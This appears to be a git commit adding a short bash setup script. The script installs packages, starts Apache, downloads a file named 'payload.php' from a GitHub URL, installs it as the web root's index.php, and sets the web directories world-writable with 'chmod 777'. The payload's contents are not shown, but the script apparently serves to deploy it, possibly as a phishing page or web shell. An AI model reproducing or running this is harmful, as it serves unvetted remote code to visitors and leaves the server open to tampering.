77df5b145c3fd8990d21ed1d99b7c2d04d5a586e
Mikhail <83498224+Modn1kk@users.noreply.github.com>
2024-03-02 18:07:27 +0300

    Add files via upload

---
+++ 1.bash
@@ -0,0 +1,13 @@
+apt update 
+apt upgrade
+apt install nodejs -y
+apt install npm -y
+apt install python3 -y
+service apache2 start
+cd /var/www/html
+wget https://raw.githubusercontent.com/Modn1kk/1/main/payload.php
+mv payload.php index.php
+chmod 777 *
+cd ..
+chmod 777 *
+cd html
